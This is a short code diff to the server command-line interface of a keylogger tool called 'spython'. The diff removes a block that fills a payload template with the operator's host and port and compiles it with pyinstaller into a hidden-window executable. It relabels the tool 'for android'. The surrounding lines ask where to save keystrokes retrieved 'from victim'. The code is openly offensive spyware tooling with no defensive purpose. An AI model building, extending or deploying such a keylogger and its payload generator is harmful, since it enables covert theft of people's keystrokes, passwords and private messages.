@@ -152,43 +152,7 @@ def main()->None:
       
         except ValueError :
             sys.stderr.write(f"Port number must be of base 10 and between 1000 and {2**16}\n")
-        flag = input("Automatically generate paylaod?[y/n](default=y): ") or "y"
-        
-        #If true, generate source code + compiled version of payload. 
-        if flag.lower() == "y":
-           TEMP = ""
-           with open(__TEMPLATE_PATH,"r") as f:
-                data = f.readlines()
-                data = [i.replace(__SIG_HOST,f"\"{HOST}\"") for i in data]
-                with open(__PAYLOAD_FILE_NAME,"w") as f2:
-                     for line in data:
-                         f2.write(line)
-                with open(__PAYLOAD_FILE_NAME, "r") as f2:
-                     new_data = f2.readlines()
-                     new_data = [ i.replace(__SIG_PORT,str(MAIN_PORT)) for i in new_data]
-                     TEMP = new_data
-                with open(__PAYLOAD_FILE_NAME,"w") as f2:
-                     for i in TEMP:
-                         f2.write(i)
-                     TEMP=""
-           #improve code below, written for testing purposes
-           print("[*]Generating payload...(This may take some time)")
-           subprocess.run(f"pyinstaller --onefile --windowed  {__PAYLOAD_FILE_NAME}",shell=True,capture_output=FLAG)
-           sleep(1)
-           if os.path.isdir("./build"): 
-              shutil.rmtree("./build")
-           if os.path.exists("payload.spec"):
-              os.remove("payload.spec")
-           print("[*]Payload generated !")
-           os.rename("./dist/payload.exe","./payload.exe")
-           os.rmdir("./dist")
-                            
-           break
-        elif flag.lower() == "n":
-             break
-        #asks user for all input again if input is incorrect
-        else:
-             continue
+   
            
     #Path of file to store retrieved data from victim
     KPATH = input("Path of file to save keystrokes: ") or "logs.txt"
@@ -244,7 +208,7 @@ if __name__ == "__main__":
                                                           
                                                           
 """
-   msg = "This is the command line interface of spython. Fill in the parametes below to start the sever!"
+   msg = "This is the command line interface of spython(for android). Fill in the parametes below to start the sever!"
    
    #Checks user OS to initialise CLI
    if os.name == "posix":
